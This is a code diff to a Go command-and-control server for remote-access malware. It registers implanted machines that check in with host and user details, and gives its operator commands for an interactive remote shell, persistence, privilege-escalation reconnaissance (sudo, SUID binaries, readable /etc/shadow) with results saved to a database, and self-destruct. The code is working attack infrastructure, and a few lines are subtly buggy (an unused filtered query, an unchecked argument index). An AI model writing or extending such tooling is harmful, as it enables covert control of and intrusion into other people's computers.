@@ -12,7 +12,6 @@ import (
 	"strings"
 	"time"
 
-
 	"golang.org/x/term"
 
 	_ "modernc.org/sqlite"
@@ -21,7 +20,7 @@ import (
 const PORT = "4443"
 const DB_PATH = "zheng.db"
 
-const (
+var (
 	colorReset  = "\033[0m"
 	colorGreen  = "\033[32m"
 	colorRed    = "\033[31m"
@@ -75,30 +74,61 @@ func initDB() {
 		arch TEXT,
 		first_seen DATETIME,
 		last_seen DATETIME,
-		active INTEGER DEFAULT 0
+		active INTEGER DEFAULT 0,
+		reconnects INTEGER DEFAULT 0
+	);
+	CREATE TABLE IF NOT EXISTS lpe_audits (
+		id INTEGER PRIMARY KEY AUTOINCREMENT,
+		client_id INTEGER,
+		hostname TEXT,
+		username TEXT,
+		timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
+		result TEXT,
+		FOREIGN KEY (client_id) REFERENCES clients(id)
 	);`
 	if _, err := db.Exec(schema); err != nil {
 		fmt.Fprintf(os.Stderr, "failed to create table: %v\n", err)
 		os.Exit(1)
 	}
+
+	// Initialize nextID from max existing ID
+	var maxID sql.NullInt64
+	db.QueryRow("SELECT MAX(id) FROM clients").Scan(&maxID)
+	if maxID.Valid {
+		nextID = int(maxID.Int64) + 1
+	}
 }
 
-func dbUpsertClient(id int, recon Recon, addr string, active bool) {
+func dbUpsertClient(id int, recon Recon, addr string, active bool, isReconnect bool) {
 	now := time.Now().Format(time.RFC3339)
 	activeInt := 0
 	if active {
 		activeInt = 1
 	}
 
-	_, err := db.Exec(`
-		INSERT INTO clients (id, ip, public_ip, hostname, username, os, arch, first_seen, last_seen, active)
-		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-		ON CONFLICT(id) DO UPDATE SET
-			ip=excluded.ip, public_ip=excluded.public_ip, hostname=excluded.hostname, username=excluded.username,
-			os=excluded.os, arch=excluded.arch, last_seen=excluded.last_seen, active=excluded.active`,
-		id, recon.IP, recon.PublicIP, recon.Hostname, recon.Username, recon.OS, recon.Arch, now, now, activeInt)
-	if err != nil {
-		fmt.Fprintf(os.Stderr, "db upsert error: %v\n", err)
+	if isReconnect {
+		_, err := db.Exec(`
+			INSERT INTO clients (id, ip, public_ip, hostname, username, os, arch, first_seen, last_seen, active, reconnects)
+			VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1)
+			ON CONFLICT(id) DO UPDATE SET
+				ip=excluded.ip, public_ip=excluded.public_ip, hostname=excluded.hostname, username=excluded.username,
+				os=excluded.os, arch=excluded.arch, last_seen=excluded.last_seen, active=excluded.active,
+				reconnects=reconnects+1`,
+			id, recon.IP, recon.PublicIP, recon.Hostname, recon.Username, recon.OS, recon.Arch, now, now, activeInt)
+		if err != nil {
+			fmt.Fprintf(os.Stderr, "db upsert error: %v\n", err)
+		}
+	} else {
+		_, err := db.Exec(`
+			INSERT INTO clients (id, ip, public_ip, hostname, username, os, arch, first_seen, last_seen, active, reconnects)
+			VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0)
+			ON CONFLICT(id) DO UPDATE SET
+				ip=excluded.ip, public_ip=excluded.public_ip, hostname=excluded.hostname, username=excluded.username,
+				os=excluded.os, arch=excluded.arch, last_seen=excluded.last_seen, active=excluded.active`,
+			id, recon.IP, recon.PublicIP, recon.Hostname, recon.Username, recon.OS, recon.Arch, now, now, activeInt)
+		if err != nil {
+			fmt.Fprintf(os.Stderr, "db upsert error: %v\n", err)
+		}
 	}
 }
 
@@ -106,8 +136,12 @@ func dbMarkInactive(id int) {
 	db.Exec("UPDATE clients SET active=0 WHERE id=?", id)
 }
 
-func getAllClients() []map[string]interface{} {
-	rows, err := db.Query("SELECT id, ip, public_ip, hostname, username, os, arch, first_seen, last_seen, active FROM clients ORDER BY id")
+func getAllClients(onlyActive bool) []map[string]interface{} {
+	query := "SELECT id, ip, public_ip, hostname, username, os, arch, first_seen, last_seen, active, reconnects FROM clients ORDER BY id"
+	if onlyActive {
+		query = "SELECT id, ip, public_ip, hostname, username, os, arch, first_seen, last_seen, active, reconnects FROM clients WHERE active = 1 ORDER BY id"
+	}
+	rows, err := db.Query("SELECT id, ip, public_ip, hostname, username, os, arch, first_seen, last_seen, active, reconnects FROM clients ORDER BY id")
 	if err != nil {
 		return nil
 	}
@@ -115,18 +149,84 @@ func getAllClients() []map[string]interface{} {
 
 	var result []map[string]interface{}
 	for rows.Next() {
-		var id, active int
+		var id, active, reconnects int
 		var ip, publicIP, hostname, username, os, arch, firstSeen, lastSeen string
-		rows.Scan(&id, &ip, &publicIP, &hostname, &username, &os, &arch, &firstSeen, &lastSeen, &active)
+		rows.Scan(&id, &ip, &publicIP, &hostname, &username, &os, &arch, &firstSeen, &lastSeen, &active, &reconnects)
 		result = append(result, map[string]interface{}{
 			"id": id, "ip": ip, "public_ip": publicIP, "hostname": hostname, "username": username,
 			"os": os, "arch": arch, "first_seen": firstSeen, "last_seen": lastSeen, "active": active,
+			"reconnects": reconnects,
 		})
 	}
 	return result
 }
 
+func dbSaveLPEAudit(clientID int, hostname, username, result string) error {
+	_, err := db.Exec(`INSERT INTO lpe_audits (client_id, hostname, username, result) VALUES (?, ?, ?, ?)`,
+		clientID, hostname, username, result)
+	return err
+}
+
+func dbGetLPEAudits(clientID int) ([]map[string]string, error) {
+	rows, err := db.Query(`SELECT id, hostname, username, timestamp, result FROM lpe_audits WHERE client_id = ? ORDER BY timestamp DESC`, clientID)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+
+	var results []map[string]string
+	for rows.Next() {
+		var id int
+		var hostname, username, timestamp, result string
+		if err := rows.Scan(&id, &hostname, &username, &timestamp, &result); err != nil {
+			continue
+		}
+		results = append(results, map[string]string{
+			"id":        fmt.Sprintf("%d", id),
+			"hostname":  hostname,
+			"username":  username,
+			"timestamp": timestamp,
+			"result":    result,
+		})
+	}
+	return results, nil
+}
+
+func findClientByRecon(recon Recon) *Client {
+	// First check in-memory (active connection)
+	for _, c := range clients {
+		if c.Recon.Hostname == recon.Hostname && c.Recon.Username == recon.Username {
+			return c
+		}
+	}
+	// Then check DB for a previous client with same hostname+username
+	var id int
+	err := db.QueryRow("SELECT id FROM clients WHERE hostname=? AND username=? ORDER BY last_seen DESC LIMIT 1",
+		recon.Hostname, recon.Username).Scan(&id)
+	if err == nil {
+		// Return a stub with the old ID so addClient can reuse it
+		return &Client{ID: id}
+	}
+	return nil
+}
+
 func addClient(conn net.Conn, recon Recon, decoder *json.Decoder, encoder *json.Encoder) *Client {
+	existing := findClientByRecon(recon)
+	if existing != nil {
+		c := &Client{
+			ID:      existing.ID,
+			Conn:    conn,
+			Addr:    conn.RemoteAddr().String(),
+			Recon:   recon,
+			Encoder: encoder,
+			Decoder: decoder,
+		}
+		clients[existing.ID] = c
+		dbUpsertClient(existing.ID, recon, c.Addr, true, true)
+		notifications++
+		return c
+	}
+
 	c := &Client{
 		ID:      nextID,
 		Conn:    conn,
@@ -136,7 +236,7 @@ func addClient(conn net.Conn, recon Recon, decoder *json.Decoder, encoder *json.
 		Decoder: decoder,
 	}
 	clients[nextID] = c
-	dbUpsertClient(nextID, recon, c.Addr, true)
+	dbUpsertClient(nextID, recon, c.Addr, true, false)
 	nextID++
 	notifications++
 	return c
@@ -150,45 +250,6 @@ func removeClient(id int) {
 	}
 }
 
-func printLPECheck(name, value string) {
-	if value == "" {
-		value = "(empty)"
-	}
-	fmt.Printf("%s[%s]%s\n", colorYellow, name, colorReset)
-	fmt.Println(value)
-	fmt.Println()
-}
-
-func readLPEResults(c *Client) map[string]string {
-	results := make(map[string]string)
-	for {
-		var msg map[string]interface{}
-		if err := c.Decoder.Decode(&msg); err != nil {
-			fmt.Printf("connection lost: %v\n", err)
-			return results
-		}
-
-		status, _ := msg["status"].(string)
-
-		switch status {
-		case "lpe_check":
-			name, _ := msg["name"].(string)
-			cmd, _ := msg["cmd"].(string)
-			fmt.Printf("%s> [%s]%s %s\n", colorGreen, name, colorReset, cmd)
-		case "lpe_skip":
-			name, _ := msg["name"].(string)
-			fmt.Printf("%s> [%s] SKIP%s\n", colorRed, name, colorReset)
-		default:
-			for k, v := range msg {
-				if str, ok := v.(string); ok {
-					results[k] = str
-				}
-			}
-			return results
-		}
-	}
-}
-
 func printPrompt() {
 	if notifications > 0 {
 		fmt.Printf("%smaster %s[%d]%s> ", colorBold, colorYellow, notifications, colorReset)
@@ -197,45 +258,42 @@ func printPrompt() {
 	}
 }
 
-func listClients() {
-	allClients := getAllClients()
+func listClients(onlyActive bool) {
+	allClients := getAllClients(onlyActive)
 	if len(allClients) == 0 {
 		fmt.Println("no clients ever seen")
 		return
 	}
 
 	fmt.Println()
-	fmt.Printf("%-4s %-9s %-21s %-15s %-15s %-15s %-10s %-6s %-10s\n",
-		"ID", "STATUS", "ADDR", "PUBLIC IP", "IP", "HOSTNAME", "USER", "OS", "LAST SEEN")
-	fmt.Println(strings.Repeat("-", 110))
+	fmt.Printf("%-4s %-12s %-15s %-15s %-10s %-6s %-10s %s\n",
+		"ID", "STATUS", "IP", "HOSTNAME", "USER", "OS", "RECONNECTS", "LAST SEEN")
+	fmt.Println(strings.Repeat("-", 95))
 
 	for _, row := range allClients {
 		id := row["id"].(int)
 		active := row["active"].(int)
 		ip := row["ip"].(string)
-		publicIP := row["public_ip"].(string)
 		hostname := row["hostname"].(string)
 		username := row["username"].(string)
 		osName := row["os"].(string)
 		lastSeen := row["last_seen"].(string)
+		reconnects := row["reconnects"].(int)
 
-		addr := publicIP
-		/*addr := ""
-		if c, ok := clients[id]; ok {
-			addr = c.Addr
-		}*/
-
-		status := fmt.Sprintf("%s● active%s", colorGreen, colorReset)
-		if active == 0 {
-			status = fmt.Sprintf("%s○ meh%s", colorRed, colorReset)
+		status := ""
+		if active == 1 {
+			status = fmt.Sprintf("%s● active%s", colorGreen, colorReset)
+		} else {
+			status = fmt.Sprintf("%s○ inactive%s", colorRed, colorReset)
 		}
 
-		if publicIP == "" {
-			publicIP = "-"
+		reconnStr := fmt.Sprintf("reconnect %d", reconnects)
+		if reconnects == 0 {
+			reconnStr = "-"
 		}
 
-		fmt.Printf("%-4d %-18s %-21s %-15s %-15s %-15s %-10s %-6s %-10s\n",
-			id, status, addr, publicIP, ip, hostname, username, osName, lastSeen)
+		fmt.Printf("%-4d %-22s %-15s %-15s %-10s %-6s %-10s %-10s\n",
+			id, status, ip, hostname, username, osName, reconnStr, lastSeen)
 	}
 	fmt.Println()
 
@@ -246,6 +304,24 @@ func sendCommand(c *Client, cmd string) error {
 	return c.Encoder.Encode(map[string]string{"cmd": cmd})
 }
 
+func readLine(conn net.Conn) (string, error) {
+	var buf []byte
+	tmp := make([]byte, 1)
+	for {
+		n, err := conn.Read(tmp)
+		if err != nil {
+			return "", err
+		}
+		if n == 0 {
+			continue
+		}
+		if tmp[0] == '\n' {
+			return string(buf), nil
+		}
+		buf = append(buf, tmp[0])
+	}
+}
+
 func handleShell(c *Client) {
 	fmt.Printf("Entering shell on client %d...\n", c.ID)
 
@@ -254,57 +330,49 @@ func handleShell(c *Client) {
 		return
 	}
 
-	// 1. Read JSON carefully. Because of json.Decoder buffering, 
-	// we CANNOT use c.Conn directly after this easily if the client sent extra bytes.
-	// However, since the client waits to send shell output *after* this JSON is sent,
-	// the connection buffer immediately following this is clean.
+	// Read raw lines until we get shell_ready
+	// This avoids json.Decoder buffering issues
 	for {
-		var msg struct {
-			Status string `json:"status"`
-		}
-		if err := c.Decoder.Decode(&msg); err != nil {
+		line, err := readLine(c.Conn)
+		if err != nil {
 			fmt.Printf("connection lost: %v\n", err)
 			return
 		}
-		if msg.Status == "shell_ready" {
+		line = strings.TrimSpace(line)
+		if strings.Contains(line, "shell_ready") {
 			break
 		}
 	}
 
-	// 2. Put YOUR local operator terminal into Raw Mode.
-	// This ensures tabs, arrow keys, and Ctrl+C are forwarded directly to the target.
+	// Put local terminal into raw mode
 	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
 	if err != nil {
 		fmt.Printf("failed to set raw terminal mode: %v\n", err)
 		return
 	}
-	// Crucial: Restore original state when exiting the shell function
 	defer func() {
 		_ = term.Restore(int(os.Stdin.Fd()), oldState)
 		fmt.Println("\n--- Exited Shell ---")
 	}()
 
-	// 3. Direct raw I/O pipelines (No more bufio string/line scanners)
 	done := make(chan struct{})
 
-	// Copy remote client shell output directly to local stdout
+	// Copy remote shell output to local stdout
 	go func() {
 		_, _ = io.Copy(os.Stdout, c.Conn)
 		close(done)
 	}()
 
-	// Copy local operator typing directly down the network wire
+	// Copy local stdin to remote shell
 	go func() {
 		_, _ = io.Copy(c.Conn, os.Stdin)
 	}()
 
-	// Block until the network connection drops or the shell exits
+	// Wait for shell to exit
 	<-done
 }
 
-
 func watchClient(c *Client) {
-	// Block until connection drops
 	var msg map[string]string
 	for {
 		if err := c.Decoder.Decode(&msg); err != nil {
@@ -329,7 +397,6 @@ func main() {
 
 	fmt.Fprintf(os.Stderr, "%slistening on :%s%s\n", colorCyan, PORT, colorReset)
 
-	// Accept connections
 	go func() {
 		for {
 			conn, err := listener.Accept()
@@ -340,7 +407,6 @@ func main() {
 		}
 	}()
 
-	// Command prompt
 	scanner := bufio.NewScanner(os.Stdin)
 	for {
 		printPrompt()
@@ -358,7 +424,8 @@ func main() {
 
 		switch cmd {
 		case "/clients":
-			listClients()
+			onlyActive := parts[1] == "active"
+			listClients(onlyActive)
 
 		case "/check":
 			if len(parts) < 2 {
@@ -379,7 +446,6 @@ func main() {
 				colorCyan, c.ID, c.Recon.Username, c.Recon.Hostname, colorReset)
 
 			alive := true
-
 			c.Conn.SetReadDeadline(time.Now().Add(3 * time.Second))
 
 			if err := sendCommand(c, "ping"); err != nil {
@@ -471,7 +537,7 @@ func main() {
 
 		case "/lpe":
 			if len(parts) < 2 {
-				fmt.Println("usage: /lpe <client_id>")
+				fmt.Println("usage: /lpe <client_id> [force]")
 				continue
 			}
 			id, err := strconv.Atoi(parts[1])
@@ -484,74 +550,63 @@ func main() {
 				fmt.Printf("client %d not found or inactive\n", id)
 				continue
 			}
-			fmt.Printf("%s[*] requesting LPE checks from client %d (%s@%s)...%s\n",
+
+			force := len(parts) >= 3 && parts[2] == "force"
+
+			if !force {
+				audits, err := dbGetLPEAudits(id)
+				if err == nil && len(audits) > 0 {
+					fmt.Printf("%s[*] found %d previous audit(s) for %s@%s%s\n",
+						colorCyan, len(audits), c.Recon.Username, c.Recon.Hostname, colorReset)
+					fmt.Println()
+					for i, audit := range audits {
+						fmt.Printf("%s=== Audit #%d - %s (%s@%s) ===%s\n",
+							colorBold, i+1, audit["timestamp"], audit["username"], audit["hostname"], colorReset)
+						fmt.Println(audit["result"])
+						fmt.Println()
+					}
+					continue
+				}
+			}
+
+			fmt.Printf("%s[*] running LPE audit on client %d (%s@%s)...%s\n",
 				colorCyan, c.ID, c.Recon.Username, c.Recon.Hostname, colorReset)
 			if err := sendCommand(c, "lpe"); err != nil {
 				fmt.Printf("failed to send command: %v\n", err)
 				continue
 			}
 
-			// Read lpe_running
 			var statusMsg struct {
 				Status string `json:"status"`
 			}
 			c.Decoder.Decode(&statusMsg)
 
-			// Read lpe_checks with check names
-			var checksMsg struct {
-				Status string   `json:"status"`
-				Checks []string `json:"checks"`
+			var resultMsg struct {
+				Status string `json:"status"`
+				Output string `json:"output"`
+				Error  string `json:"error,omitempty"`
 			}
-			if err := c.Decoder.Decode(&checksMsg); err != nil {
+			if err := c.Decoder.Decode(&resultMsg); err != nil {
 				fmt.Printf("connection lost: %v\n", err)
 				continue
 			}
 
-			// Display checks and prompt for skip
 			fmt.Println()
-			fmt.Printf("%savailable checks:%s\n", colorBold, colorReset)
-			for i, name := range checksMsg.Checks {
-				fmt.Printf("  %d. %s\n", i+1, name)
-			}
+			fmt.Printf("%s=== LPE AUDIT RESULTS for %s@%s ===%s\n", colorBold, c.Recon.Username, c.Recon.Hostname, colorReset)
 			fmt.Println()
-			fmt.Printf("%senter comma-separated names to skip (or 'none'): %s", colorYellow, colorReset)
-
-			// Read user input for skip list
-			scanSkip := bufio.NewScanner(os.Stdin)
-			var skipList []string
-			if scanSkip.Scan() {
-				input := strings.TrimSpace(scanSkip.Text())
-				if input != "none" && input != "" {
-					for _, s := range strings.Split(input, ",") {
-						skipList = append(skipList, strings.TrimSpace(s))
-					}
+			if resultMsg.Status == "lpe_done" {
+				fmt.Println(resultMsg.Output)
+				if err := dbSaveLPEAudit(id, c.Recon.Hostname, c.Recon.Username, resultMsg.Output); err != nil {
+					fmt.Printf("%s[-] failed to save audit to db: %v%s\n", colorRed, err, colorReset)
+				} else {
+					fmt.Printf("%s[+] audit saved to database%s\n", colorGreen, colorReset)
+				}
+			} else {
+				fmt.Printf("%s[-] audit failed: %s%s\n", colorRed, resultMsg.Error, colorReset)
+				if resultMsg.Output != "" {
+					fmt.Println(resultMsg.Output)
 				}
 			}
-
-			// Send skip list
-			c.Encoder.Encode(map[string]interface{}{"cmd": "lpe_skip", "skip": skipList})
-
-			fmt.Println()
-			fmt.Printf("%s[*] running LPE checks (skipping: %v)...%s\n", colorCyan, skipList, colorReset)
-			fmt.Println()
-
-			// Read progress and results
-			lpeResults := readLPEResults(c)
-
-			fmt.Println()
-			fmt.Printf("%s=== LPE RESULTS for %s@%s ===%s\n", colorBold, c.Recon.Username, c.Recon.Hostname, colorReset)
-			fmt.Println()
-			printLPECheck("OS Info", lpeResults["os_info"])
-			printLPECheck("Sudo", lpeResults["sudo"])
-			printLPECheck("SUID Binaries", lpeResults["suid"])
-			printLPECheck("Cron", lpeResults["cron"])
-			printLPECheck("Capabilities", lpeResults["capabilities"])
-			printLPECheck("Docker", lpeResults["docker"])
-			printLPECheck("Writable PATH dirs", lpeResults["path_writable"])
-			printLPECheck("/etc/passwd writable", lpeResults["passwd_writable"])
-			printLPECheck("/etc/shadow readable", lpeResults["shadow_readable"])
-			printLPECheck("World-writable files", lpeResults["world_writable"])
-			printLPECheck("Interesting files", lpeResults["interesting_files"])
 			fmt.Println()
 
 		case "/clear":
@@ -578,7 +633,6 @@ func main() {
 				fmt.Printf("failed to send destroy: %v\n", err)
 				continue
 			}
-			// Wait for response
 			var msg struct {
 				Status string `json:"status"`
 				Error  string `json:"error,omitempty"`
@@ -600,7 +654,7 @@ func main() {
 
 		default:
 			fmt.Printf("unknown command: %s\n", cmd)
-			fmt.Println("commands: /clients, /check <id>, /persist <id>, /shell <id>, /lpe <id>, /destroy <id>, /clear, /done")
+			fmt.Println("commands: /clients, /check <id>, /persist <id>, /shell <id>, /lpe <id> [force], /destroy <id>, /clear, /done")
 		}
 	}
 }
@@ -617,7 +671,7 @@ func handleConnection(conn net.Conn) {
 	}
 
 	c := addClient(conn, recon, decoder, encoder)
-	fmt.Printf("\n%s[+] new client %d: %s@%s (%s) from %s%s\n",
+	fmt.Printf("\n%s[+] client %d connected: %s@%s (%s) from %s%s\n",
 		colorGreen, c.ID, recon.Username, recon.Hostname, recon.IP, c.Addr, colorReset)
 	printPrompt()
 
